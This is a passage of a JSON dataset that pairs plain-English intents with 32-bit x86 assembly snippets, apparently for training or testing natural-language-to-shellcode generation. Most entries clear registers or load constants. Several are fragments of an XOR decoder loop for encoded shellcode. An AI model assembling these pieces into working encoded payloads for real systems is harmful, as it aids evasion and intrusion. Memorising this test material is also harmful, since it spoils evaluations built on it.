      "dl"
    ],
    "snippet_tokens": [
      "xor",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "perform the xor between the next byte of the shellcode and the dl register",
    "rewritten_intent": "perform the xor between the next byte of the shellcode and the dl register",
    "snippet": "xor byte [esi+1], dl",
    "slot_map": {},
    "intent_tokens": [
      "perform",
      "xor",
      "next",
      "byte",
      "shellcode",
      "and",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "byte",
      "[",
      "esi+1",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "perform the xor between ch and the byte in esi+edx",
    "rewritten_intent": "perform the xor between ch and the byte in esi+edx",
    "snippet": "xor ch, byte [esi + edx]",
    "slot_map": {
      "esi+edx": "var1",
      "ch": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "var0",
      "and",
      "byte",
      "esi+edx"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "]"
    ]
  },
  {
    "intent": "perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero",
    "rewritten_intent": "perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero",
    "snippet": "xor cl, 0x32 \\n je short encodedshellcode",
    "slot_map": {
      "0x32": "var0",
      "encodedshellcode": "var1"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "cl",
      "and",
      "var0",
      "and",
      "jump",
      "short",
      "var1",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "var0",
      "\\n",
      "je",
      "short",
      "var1"
    ]
  },
  {
    "intent": "perform xor between cl and 0xaa and jump to next_cycle if the result is not zero",
    "rewritten_intent": "perform xor between cl and 0xaa and jump to next_cycle if the result is not zero",
    "snippet": "xor cl, 0xaa \\n jnz next_cycle",
    "slot_map": {
      "next_cycle": "var2",
      "0xaa": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "cl",
      "and",
      "var0",
      "and",
      "jump",
      "var2",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var2"
    ]
  },
  {
    "intent": "perform xor between cl and 0xaa and jump to shift decode if the result is zero",
    "rewritten_intent": "perform xor between cl and 0xaa and jump to shift decode if the result is zero",
    "snippet": "xor cl, 0xaa \\n jz shift_decode",
    "slot_map": {
      "0xaa": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "cl",
      "and",
      "var0",
      "and",
      "jump",
      "shift",
      "decode",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "var0",
      "\\n",
      "jz",
      "shift_decode"
    ]
  },
  {
    "intent": "perform the xor between cl and the byte in esi+edx",
    "rewritten_intent": "perform the xor between cl and the byte in esi+edx",
    "snippet": "xor cl, byte [esi + edx]",
    "slot_map": {
      "esi+edx": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "cl",
      "and",
      "byte",
      "esi+edx"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "]"
    ]
  },
  {
    "intent": "perform xor between dl and 0xbb and jump to next_cycle if the result is zero",
    "rewritten_intent": "perform xor between dl and 0xbb and jump to next_cycle if the result is zero",
    "snippet": "xor dl, 0xbb \\n jz next_cycle",
    "slot_map": {
      "next_cycle": "var2",
      "0xbb": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "dl",
      "and",
      "var0",
      "and",
      "jump",
      "var2",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "dl",
      ",",
      "var0",
      "\\n",
      "jz",
      "var2"
    ]
  },
  {
    "intent": "clear the eax register and move 0x1 in the lowest byte of the register",
    "rewritten_intent": "clear the eax register and move 0x1 in the lowest byte of the register",
    "snippet": "xor eax, eax \\n mov al, 0x1",
    "slot_map": {
      "0x1": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear the eax register and move 22 into the lower byte of the register",
    "rewritten_intent": "clear the eax register and move 22 into the lower byte of the register",
    "snippet": "xor eax, eax \\n mov al, 22",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "22",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "22"
    ]
  },
  {
    "intent": "clear the eax and the ebx registers",
    "rewritten_intent": "clear the eax and the ebx registers",
    "snippet": "xor eax, eax \\n xor ebx, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear eax, ebx and ecx",
    "rewritten_intent": "clear eax, ebx and ecx",
    "snippet": "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "var1",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2"
    ]
  },
  {
    "intent": "zero out eax, ebx, ecx and edx",
    "rewritten_intent": "zero out eax, ebx, ecx and edx",
    "snippet": "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1",
      "ecx": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "var1",
      "var2",
      "and",
      "var3"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "clear eax, ebx, ecx and edx registers",
    "rewritten_intent": "clear eax, ebx, ecx and edx registers",
    "snippet": "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1",
      "ecx": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "var1",
      "var2",
      "and",
      "var3",
      "registers"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "zero the value on ebp",
    "rewritten_intent": "zero the value on ebp",
    "snippet": "xor ebp, ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "zero",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ebx register",
    "rewritten_intent": "zero out the ebx register",
    "snippet": "xor ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ebx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "zero out the ebx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor ebx, ebx \\n mov bl, [esi+1]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "bl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "clear the ebx and edx registers",
    "rewritten_intent": "clear the ebx and edx registers",
    "snippet": "xor ebx, ebx \\n xor edx, edx",
    "slot_map": {
      "ebx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear ecx register",
    "rewritten_intent": "clear ecx register",
    "snippet": "xor ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ecx register and move 0x19 into the lower byte of the register",
    "rewritten_intent": "zero out the ecx register and move 0x19 into the lower byte of the register",
    "snippet": "xor ecx, ecx \\n mov cl, 0x19",
    "slot_map": {
      "0x19": "var1",
      "ecx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "move",
      "var1",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "cl",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear the counter and move 0x1e into the first byte of the register",
    "rewritten_intent": "clear the counter and move 0x1e into the first byte of the register",
    "snippet": "xor ecx, ecx \\n mov cl, 0x1e",
    "slot_map": {
      "0x1e": "var0"
    },
    "intent_tokens": [
      "clear",
      "counter",
      "and",
      "move",
      "var0",
      "first",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the ecx register and move 23 into the lower byte of the register",
    "rewritten_intent": "zero out the ecx register and move 23 into the lower byte of the register",
    "snippet": "xor ecx, ecx \\n mov cl, 23",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "move",
      "23",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "cl",
      ",",
      "23"
    ]
  },
  {
    "intent": "zero out the ecx register and move 25 in the lower 8 bits of the register",
    "rewritten_intent": "zero out the ecx register and move 25 in the lower 8 bits of the register",
    "snippet": "xor ecx, ecx \\n mov cl, 25",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "move",
      "25",
      "lower",
      "8",
      "bits",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "cl",
      ",",
      "25"
    ]
  },
  {
    "intent": "zero out the loop counter and move shellcode_length in the first byte",
    "rewritten_intent": "zero out the loop counter and move shellcode_length in the first byte",
    "snippet": "xor ecx, ecx \\n mov cl, shellcode_length",
    "slot_map": {
      "shellcode_length": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "loop",
      "counter",
      "and",
      "move",
      "var0",
      "first",
      "byte"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "trick to clear eax and ecx",
    "rewritten_intent": "trick to clear eax and ecx",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "trick",
      "clear",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "mul",
      "var1"
    ]
  },
  {
    "intent": "cause both eax and edx to become zero",
    "rewritten_intent": "cause both eax and edx to become zero",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "cause",
      "both",
      "var0",
      "and",
      "var1",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "mul",
      "ecx"
    ]
  },
  {
    "intent": "zero out eax and edx registers",
    "rewritten_intent": "zero out eax and edx registers",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xor",
      "ecx",
      ",",
      "ecx",
      "\\n",
      "mul",
      "ecx"
    ]
  },
  {
    "intent": "clear ecx and eax",
    "rewritten_intent": "clear ecx and eax",
    "snippet": "xor ecx, ecx \\n mul ecx",
    "slot_map": {
      "ecx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mul",
      "var0"
    ]
  },
  {
    "intent": "zero out the edi, eax, ebx and edx registers",
    "rewritten_intent": "zero out the edi, eax, ebx and edx registers",
    "snippet": "xor edi, edi \\n xor eax, eax \\n xor ebx, ebx \\n xor edx, edx",
    "slot_map": {
      "edi": "var0",
      "eax": "var1",
      "ebx": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "var1",
      "var2",
      "and",
      "var3",
      "registers"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "xor",
      "var2",
      ",",
      "var2",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "clear the edx register and move the current byte of the shellcode into the lowest byte of the register",
    "rewritten_intent": "clear the edx register and move the current byte of the shellcode into the lowest byte of the register",
    "snippet": "xor edx, edx \\n mov dl, [esi]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "current",
      "byte",
      "shellcode",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "dl",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "define xordecode",
    "rewritten_intent": "define xordecode",
    "snippet": "xordecode:",
    "slot_map": {
      "xordecode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  }
]